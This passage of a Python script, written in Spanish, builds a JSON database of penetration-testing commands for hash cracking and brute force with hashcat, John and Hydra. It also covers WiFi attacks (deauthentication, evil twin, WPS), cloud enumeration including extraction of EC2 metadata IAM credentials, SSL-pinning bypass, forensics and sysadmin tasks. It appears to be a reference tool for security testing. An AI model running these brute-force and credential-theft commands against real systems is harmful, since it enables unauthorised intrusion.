    "Crackea hashes bcrypt (modo 3200), considerablemente más lento debido al factor de coste del algoritmo.",
    "bash",
    "hashcat -m 3200 bcrypt_hashes.txt rockyou.txt",
    "cracking,hashcat,bcrypt", "high")

CMD(crack, "John the Ripper - crackeo automático",
    "Crackea hashes detectando automáticamente el formato, útil cuando no se conoce con certeza el algoritmo.",
    "bash",
    "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --show hashes.txt",
    "cracking,johntheripper,dictionary", "high")

CMD(crack, "John the Ripper - crackeo de zip/rar protegidos",
    "Extrae el hash de un archivo comprimido protegido con contraseña y lo crackea con John.",
    "bash",
    "zip2john protected.zip > zip_hash.txt\njohn zip_hash.txt --wordlist=rockyou.txt",
    "cracking,johntheripper,zip,archives", "medium")

CMD(crack, "John the Ripper - crackeo de claves SSH protegidas",
    "Extrae el hash de una clave privada SSH protegida con passphrase y la crackea offline.",
    "bash",
    "ssh2john id_rsa > ssh_hash.txt\njohn ssh_hash.txt --wordlist=rockyou.txt",
    "cracking,johntheripper,ssh,privatekey", "high")

CMD(crack, "Hydra - fuerza bruta SSH",
    "Ataque de fuerza bruta contra un servicio SSH usando una lista de usuarios y contraseñas.",
    "bash",
    "hydra -L users.txt -P rockyou.txt ssh://10.10.10.10",
    "cracking,hydra,bruteforce,ssh", "high")

CMD(crack, "Hydra - fuerza bruta formulario web (POST)",
    "Ataque de fuerza bruta contra un formulario de login HTTP POST, indicando el patrón de fallo de autenticación.",
    "bash",
    'hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"',
    "cracking,hydra,bruteforce,webform", "high")

CMD(crack, "Hydra - fuerza bruta RDP",
    "Ataque de fuerza bruta contra un servicio de Escritorio Remoto (RDP) de Windows.",
    "bash",
    "hydra -L users.txt -P rockyou.txt rdp://10.10.10.10",
    "cracking,hydra,bruteforce,rdp", "high")

CMD(crack, "Hydra - fuerza bruta FTP",
    "Ataque de fuerza bruta contra un servicio FTP usando listas de usuarios y contraseñas comunes.",
    "bash",
    "hydra -L users.txt -P rockyou.txt ftp://10.10.10.10",
    "cracking,hydra,bruteforce,ftp", "high")

CMD(crack, "Medusa - fuerza bruta paralela multi-protocolo",
    "Alternativa a Hydra para ataques de fuerza bruta paralelos contra múltiples protocolos de red.",
    "bash",
    "medusa -h 10.10.10.10 -U users.txt -P rockyou.txt -M ssh",
    "cracking,medusa,bruteforce", "high")

CMD(crack, "CeWL - generación de wordlist personalizada",
    "Genera una wordlist personalizada a partir de las palabras encontradas en un sitio web, útil para ataques dirigidos.",
    "bash",
    "cewl https://example.com -m 5 -w custom_wordlist.txt",
    "cracking,cewl,wordlist,osint", "info")

CMD(crack, "CUPP - generación de wordlist basada en perfil",
    "Genera una wordlist de contraseñas candidatas a partir de datos personales conocidos del objetivo (nombre, fechas, mascotas).",
    "bash",
    "python3 cupp.py -i",
    "cracking,cupp,wordlist,socialengineering", "info")

CMD(crack, "Hashcat - benchmark de rendimiento GPU",
    "Mide el rendimiento de crackeo de la GPU/CPU disponible para distintos algoritmos antes de lanzar un ataque largo.",
    "bash",
    "hashcat -b",
    "cracking,hashcat,benchmark", "info")


# ════════════════════════════════════════════════════════════════
# 13. WIRELESS HACKING
# ════════════════════════════════════════════════════════════════
wireless = SECTION("Wireless Hacking", "wifi")

CMD(wireless, "Activar modo monitor",
    "Pone la interfaz inalámbrica en modo monitor para poder capturar tráfico 802.11 en bruto.",
    "bash",
    "airmon-ng check kill\nairmon-ng start wlan0",
    "wireless,wifi,airmon-ng,monitor", "info")

CMD(wireless, "Escaneo de redes WiFi cercanas",
    "Escanea y lista las redes inalámbricas disponibles junto con BSSID, canal y tipo de cifrado.",
    "bash",
    "airodump-ng wlan0mon",
    "wireless,wifi,airodump-ng,recon", "info")

CMD(wireless, "Captura de handshake WPA/WPA2",
    "Captura el handshake de autenticación de una red WPA/WPA2 específica para su posterior crackeo offline.",
    "bash",
    "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon",
    "wireless,wifi,handshake,wpa,capture", "medium")

CMD(wireless, "Deautenticación de clientes (forzar handshake)",
    "Envía paquetes de desautenticación a un cliente conectado para forzar una nueva negociación y capturar el handshake.",
    "bash",
    "aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon",
    "wireless,wifi,deauth,aireplay-ng", "medium")

CMD(wireless, "Crackeo de handshake WPA/WPA2 con Aircrack-ng",
    "Crackea offline un handshake WPA/WPA2 capturado previamente usando una wordlist de contraseñas.",
    "bash",
    "aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap",
    "wireless,wifi,aircrack-ng,cracking", "high")

CMD(wireless, "Conversión y crackeo de handshake con Hashcat",
    "Convierte una captura .cap a formato hashcat (.hc22000) y lanza el ataque de diccionario con aceleración GPU.",
    "bash",
    "hcxpcapngtool -o hash.hc22000 handshake-01.cap\nhashcat -m 22000 hash.hc22000 rockyou.txt",
    "wireless,wifi,hashcat,cracking", "high")

CMD(wireless, "Ataque WPS con Reaver",
    "Explota una implementación insegura de WPS para recuperar la contraseña WPA/WPA2 mediante fuerza bruta del PIN.",
    "bash",
    "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
    "wireless,wifi,wps,reaver,bruteforce", "high")

CMD(wireless, "Creación de Access Point falso (Evil Twin)",
    "Levanta un punto de acceso falso con el mismo SSID que la red objetivo para capturar credenciales mediante portal cautivo.",
    "bash",
    "airbase-ng -e \"NombreRed\" -c 6 wlan0mon",
    "wireless,wifi,eviltwin,phishing", "high")

CMD(wireless, "Bettercap - ataques de red inalámbrica y MITM",
    "Suite de herramientas para reconocimiento y ataques activos sobre redes WiFi y Ethernet (ARP spoofing incluido).",
    "bash",
    "bettercap -iface wlan0",
    "wireless,bettercap,mitm,arpspoofing", "high",
    "https://www.bettercap.org/")

CMD(wireless, "Restaurar interfaz a modo managed",
    "Devuelve la interfaz inalámbrica al modo normal (managed) tras finalizar las pruebas en modo monitor.",
    "bash",
    "airmon-ng stop wlan0mon\nservice NetworkManager restart",
    "wireless,wifi,airmon-ng,cleanup", "info")


# ════════════════════════════════════════════════════════════════
# 14. CLOUD SECURITY (AWS / AZURE / GCP)
# ════════════════════════════════════════════════════════════════
cloud = SECTION("Cloud Security", "cloud")

CMD(cloud, "AWS CLI - enumeración de identidad actual",
    "Comprueba qué identidad y permisos tienen las credenciales AWS configuradas actualmente.",
    "bash",
    "aws sts get-caller-identity",
    "cloud,aws,enumeration,iam", "info")

CMD(cloud, "AWS CLI - enumeración de buckets S3",
    "Lista todos los buckets S3 accesibles con las credenciales actuales.",
    "bash",
    "aws s3 ls",
    "cloud,aws,s3,enumeration", "info")

CMD(cloud, "AWS - búsqueda de buckets S3 públicos",
    "Comprueba si un bucket S3 conocido es accesible públicamente sin autenticación, un error de configuración muy común.",
    "bash",
    "aws s3 ls s3://nombre-del-bucket --no-sign-request",
    "cloud,aws,s3,misconfig,publicbucket", "high")

CMD(cloud, "AWS Pacu - framework de explotación de AWS",
    "Framework de post-explotación específico para entornos AWS, automatiza enumeración y ataques de escalada de privilegios IAM.",
    "bash",
    "pacu\n> import_keys --all\n> run iam__enum_permissions",
    "cloud,aws,pacu,framework", "medium",
    "https://github.com/RhinoSecurityLabs/pacu")

CMD(cloud, "ScoutSuite - auditoría multi-cloud",
    "Genera un informe HTML de auditoría de seguridad para AWS, Azure o GCP, identificando configuraciones inseguras.",
    "bash",
    "scout aws --profile mi-perfil",
    "cloud,aws,azure,gcp,scoutsuite,audit", "info",
    "https://github.com/nccgroup/ScoutSuite")

CMD(cloud, "Enumeración de roles y políticas IAM (AWS)",
    "Lista los roles IAM disponibles y sus políticas adjuntas para detectar privilegios excesivos o mal configurados.",
    "bash",
    "aws iam list-roles\naws iam list-attached-role-policies --role-name NombreRol",
    "cloud,aws,iam,enumeration", "info")

CMD(cloud, "Azure CLI - enumeración de suscripción actual",
    "Muestra información de la suscripción Azure activa tras autenticarse.",
    "bash",
    "az account show",
    "cloud,azure,enumeration", "info")

CMD(cloud, "Azure - enumeración de máquinas virtuales",
    "Lista todas las máquinas virtuales accesibles dentro de la suscripción Azure actual.",
    "bash",
    "az vm list --output table",
    "cloud,azure,vm,enumeration", "info")

CMD(cloud, "AzureHound - recolección de datos para BloodHound",
    "Recolecta datos de Azure AD/Entra ID en formato compatible con BloodHound para análisis de rutas de ataque en la nube.",
    "bash",
    "azurehound -u jdoe@corp.onmicrosoft.com -p 'Password123!' list",
    "cloud,azure,azurehound,bloodhound", "info",
    "https://github.com/BloodHoundAD/AzureHound")

CMD(cloud, "GCP - enumeración de proyectos accesibles",
    "Lista los proyectos de Google Cloud accesibles con la cuenta actualmente autenticada.",
    "bash",
    "gcloud projects list",
    "cloud,gcp,enumeration", "info")

CMD(cloud, "GCP - enumeración de buckets de Cloud Storage",
    "Lista los buckets de almacenamiento accesibles en un proyecto GCP.",
    "bash",
    "gsutil ls",
    "cloud,gcp,storage,enumeration", "info")

CMD(cloud, "Trufflehog - búsqueda de secretos en repositorios",
    "Escanea repositorios Git (incluyendo historial de commits) en busca de claves API, tokens y credenciales expuestas accidentalmente.",
    "bash",
    "trufflehog git https://github.com/empresa/repo.git",
    "cloud,trufflehog,secrets,git", "high",
    "https://github.com/trufflesecurity/trufflehog")

CMD(cloud, "Acceso al endpoint de metadatos de instancia EC2",
    "Consulta el endpoint de metadatos de una instancia AWS EC2 comprometida para extraer credenciales temporales del rol IAM asociado.",
    "bash",
    "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE_ROL",
    "cloud,aws,ec2,metadata,ssrf", "critical")


# ════════════════════════════════════════════════════════════════
# 15. MOBILE SECURITY (Android / iOS)
# ════════════════════════════════════════════════════════════════
mobile = SECTION("Mobile Security", "mobile")

CMD(mobile, "ADB - listar dispositivos conectados",
    "Lista los dispositivos Android conectados y disponibles para depuración vía ADB.",
    "bash",
    "adb devices",
    "mobile,android,adb,enumeration", "info")

CMD(mobile, "ADB - extraer APK instalado",
    "Localiza y extrae el archivo APK de una aplicación instalada en el dispositivo para análisis estático posterior.",
    "bash",
    "adb shell pm path com.example.app\nadb pull /data/app/com.example.app-1/base.apk",
    "mobile,android,adb,apk", "info")

CMD(mobile, "APKTool - decompilación de APK",
    "Decompila un APK a su código Smali y recursos originales, permitiendo análisis estático del código.",
    "bash",
    "apktool d app.apk -o app_decompiled",
    "mobile,android,apktool,staticanalysis", "info")

CMD(mobile, "JADX - decompilación a Java legible",
    "Decompila un APK directamente a código fuente Java pseudo-original, más legible que Smali para revisión manual.",
    "bash",
    "jadx -d app_source app.apk",
    "mobile,android,jadx,staticanalysis", "info")

CMD(mobile, "MobSF - análisis automático estático y dinámico",
    "Levanta el framework Mobile Security Framework para análisis automatizado de seguridad de apps Android/iOS.",
    "bash",
    "docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest",
    "mobile,android,ios,mobsf,automation", "info",
    "https://github.com/MobSF/Mobile-Security-Framework-MobSF")

CMD(mobile, "Frida - hooking dinámico de funciones",
    "Engancha (hookea) una función específica de una app en ejecución para inspeccionar o modificar su comportamiento en tiempo real.",
    "bash",
    "frida -U -f com.example.app -l hook_script.js --no-pause",
    "mobile,android,ios,frida,dynamicanalysis", "medium",
    "https://frida.re/")

CMD(mobile, "Objection - exploración runtime sin jailbreak/root",
    "Herramienta basada en Frida para explorar y manipular el runtime de una aplicación móvil sin necesidad de root o jailbreak.",
    "bash",
    "objection -g com.example.app explore",
    "mobile,android,ios,objection,runtime", "info")

CMD(mobile, "Bypass de SSL Pinning con Frida",
    "Script estándar de Frida para deshabilitar la verificación de certificados SSL en apps Android e interceptar el tráfico con Burp.",
    "bash",
    "frida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause",
    "mobile,android,sslpinning,bypass,frida", "medium")

CMD(mobile, "Extracción de datos de SharedPreferences (Android)",
    "Accede a archivos SharedPreferences de una app para revisar si almacenan datos sensibles sin cifrar.",
    "bash",
    "adb shell run-as com.example.app cat /data/data/com.example.app/shared_prefs/config.xml",
    "mobile,android,storage,sensitivedata", "medium")

CMD(mobile, "Análisis de tráfico de app móvil con Burp",
    "Configura el dispositivo móvil para enrutar su tráfico HTTP/HTTPS a través de Burp Suite como proxy de intercepción.",
    "text",
    """1. Conectar el móvil a la misma red que el equipo con Burp
2. Configurar proxy WiFi manual: IP del equipo, puerto 8080
3. Instalar el certificado CA de Burp en el dispositivo
4. Interceptar y analizar las peticiones de la app""",
    "mobile,burpsuite,proxy,trafficanalysis", "info")

# ════════════════════════════════════════════════════════════════
# 16. FORENSE Y ESTEGANOGRAFÍA (CTF / Forensics)
# ════════════════════════════════════════════════════════════════
forensics = SECTION("Forense & Esteganografía", "binary")

CMD(forensics, "Identificación de tipo de archivo",
    "Identifica el tipo real de un archivo analizando su contenido binario (magic bytes), independientemente de la extensión.",
    "bash",
    "file archivo_sospechoso",
    "forensics,file,fileidentification", "info")

CMD(forensics, "Strings - extracción de cadenas legibles",
    "Extrae todas las cadenas de texto legibles de un binario, útil para encontrar credenciales, URLs o flags embebidas.",
    "bash",
    "strings -n 8 binario | grep -i flag",
    "forensics,strings,binaryanalysis", "info")

CMD(forensics, "Binwalk - análisis de firmware/archivos embebidos",
    "Analiza un archivo en busca de otros archivos o sistemas de ficheros embebidos dentro (común en firmware e imágenes).",
    "bash",
    "binwalk -e archivo.bin",
    "forensics,binwalk,firmware,embedded", "info")

CMD(forensics, "Esteganografía - extracción con steghide",
    "Extrae datos ocultos embebidos dentro de una imagen o archivo de audio usando steghide.",
    "bash",
    "steghide extract -sf imagen.jpg",
    "forensics,steganography,steghide", "info")

CMD(forensics, "Esteganografía - análisis de metadatos EXIF",
    "Revisa los metadatos EXIF de una imagen en busca de comentarios, geolocalización o datos ocultos.",
    "bash",
    "exiftool imagen.jpg",
    "forensics,steganography,exif,metadata", "info")

CMD(forensics, "Esteganografía - zsteg para imágenes PNG/BMP",
    "Detecta datos ocultos en los bits menos significativos (LSB) de imágenes PNG y BMP.",
    "bash",
    "zsteg imagen.png -a",
    "forensics,steganography,zsteg,lsb", "info")

CMD(forensics, "Análisis de memoria RAM con Volatility 3",
    "Analiza un volcado de memoria RAM para extraer procesos en ejecución, conexiones de red y artefactos forenses.",
    "bash",
    "vol3 -f memdump.raw windows.pslist\nvol3 -f memdump.raw windows.netscan",
    "forensics,volatility,memoryforensics", "info",
    "https://github.com/volatilityfoundation/volatility3")

CMD(forensics, "Análisis de capturas de tráfico con tshark",
    "Filtra y extrae información relevante de un archivo .pcap directamente desde línea de comandos.",
    "bash",
    "tshark -r captura.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri",
    "forensics,wireshark,tshark,pcap,network", "info")

CMD(forensics, "Extracción de objetos HTTP de un PCAP",
    "Extrae archivos transferidos por HTTP (imágenes, ejecutables, documentos) directamente de una captura de red.",
    "bash",
    "tshark -r captura.pcap --export-objects http,extracted_files/",
    "forensics,wireshark,pcap,fileextraction", "info")

CMD(forensics, "CyberChef - decodificación en cadena (referencia)",
    "Herramienta web 'navaja suiza' para decodificar, cifrar y transformar datos encadenando operaciones (Base64, XOR, ROT13...).",
    "text",
    "https://gchq.github.io/CyberChef/\n# Útil para: Base64, Hex, XOR Brute Force, JWT decode, etc.",
    "forensics,cyberchef,decoding,encoding", "info")

CMD(forensics, "Decodificación rápida de Base64",
    "Decodifica una cadena Base64 directamente desde terminal, sin depender de herramientas externas.",
    "bash",
    "echo 'SGVsbG8gV29ybGQh' | base64 -d",
    "forensics,base64,decoding,encoding", "info")

CMD(forensics, "Análisis de JWT (JSON Web Token)",
    "Decodifica un token JWT para inspeccionar su cabecera y payload sin necesidad de conocer la clave de firma.",
    "bash",
    "echo 'TOKEN_JWT' | cut -d. -f1 | base64 -d 2>/dev/null\necho 'TOKEN_JWT' | cut -d. -f2 | base64 -d 2>/dev/null",
    "forensics,jwt,decoding,authentication", "info")


# ════════════════════════════════════════════════════════════════
# 17. SYSADMIN, REDES Y UTILIDADES
# ════════════════════════════════════════════════════════════════
sysadmin = SECTION("Sysadmin & Utilidades", "server")

CMD(sysadmin, "Comprobar puertos en escucha (Linux)",
    "Lista todos los puertos en escucha del sistema junto con el proceso asociado.",
    "bash",
    "ss -tulnp",
    "sysadmin,linux,network,ports", "info")

CMD(sysadmin, "Comprobar puertos en escucha (Windows)",
    "Equivalente Windows para listar conexiones y puertos en escucha junto con el PID del proceso.",
    "powershell",
    "netstat -ano | findstr LISTENING",
    "sysadmin,windows,network,ports", "info")

CMD(sysadmin, "Generar par de claves SSH",
    "Genera un nuevo par de claves SSH ED25519 (más seguro y rápido que RSA) para autenticación sin contraseña.",
    "bash",
    "ssh-keygen -t ed25519 -C \"usuario@maquina\"",
    "sysadmin,ssh,keys", "info")

CMD(sysadmin, "Copiar clave pública SSH a un servidor",
    "Copia la clave pública local al archivo authorized_keys de un servidor remoto para login sin contraseña.",
    "bash",
    "ssh-copy-id usuario@10.10.10.10",
    "sysadmin,ssh,keys", "info")

CMD(sysadmin, "Crear snapshot de la base de datos SQLite (backup)",
    "Genera una copia de seguridad consistente de una base de datos SQLite en caliente sin detener el servicio.",
    "bash",
    "sqlite3 command-vault.db \".backup 'backup.db'\"",
    "sysadmin,sqlite,backup,database", "info")

CMD(sysadmin, "Comprobar espacio en disco",
    "Muestra el uso de espacio en disco de todos los sistemas de archivos montados en formato legible.",
    "bash",
    "df -h",
    "sysadmin,linux,disk,monitoring", "info")

CMD(sysadmin, "Monitorización de logs en tiempo real",
    "Sigue en tiempo real las últimas líneas añadidas a un archivo de log, útil durante pruebas activas.",
    "bash",
    "tail -f /var/log/syslog",
    "sysadmin,linux,logs,monitoring", "info")

CMD(sysadmin, "Captura de tráfico de red con tcpdump",
    "Captura tráfico de red en una interfaz específica y lo guarda en un archivo .pcap para análisis posterior.",
    "bash",
    "tcpdump -i eth0 -w captura.pcap",
    "sysadmin,network,tcpdump,pcap", "info")

CMD(sysadmin, "Generar contraseña aleatoria segura",
    "Genera una contraseña aleatoria criptográficamente segura usando OpenSSL.",
    "bash",
    "openssl rand -base64 24",
    "sysadmin,password,openssl,random", "info")

CMD(sysadmin, "Crear túnel reverso con SSH (exponer servicio local)",
    "Expone un puerto local hacia un servidor remoto, útil para recibir callbacks o exponer un servicio de laboratorio temporalmente.",
    "bash",
    "ssh -R 8080:localhost:80 usuario@servidor-remoto",
    "sysadmin,ssh,tunneling,portforwarding", "info")

CMD(sysadmin, "Comprimir y cifrar un archivo con OpenSSL",
    "Comprime y cifra un archivo con AES-256 para transferirlo de forma segura entre sistemas.",
    "bash",
    "tar czf - carpeta/ | openssl enc -aes-256-cbc -pbkdf2 -out backup.tar.gz.enc",
    "sysadmin,openssl,encryption,backup", "info")

CMD(sysadmin, "Actualización del sistema (Debian/Ubuntu)",
    "Actualiza el listado de paquetes e instala las actualizaciones disponibles del sistema.",
    "bash",
    "sudo apt update && sudo apt upgrade -y",
    "sysadmin,linux,debian,updates", "info")


# ════════════════════════════════════════════════════════════════
# OUTPUT FINAL
# ════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    total = sum(len(s["commands"]) for s in SECTIONS)
    print(f"Secciones: {len(SECTIONS)} | Comandos: {total}")
    out = {"sections": SECTIONS}
    with open(os.path.join(os.path.dirname(__file__), "commands-database.json"), "w", encoding="utf-8") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    print("OK -> commands-database.json")
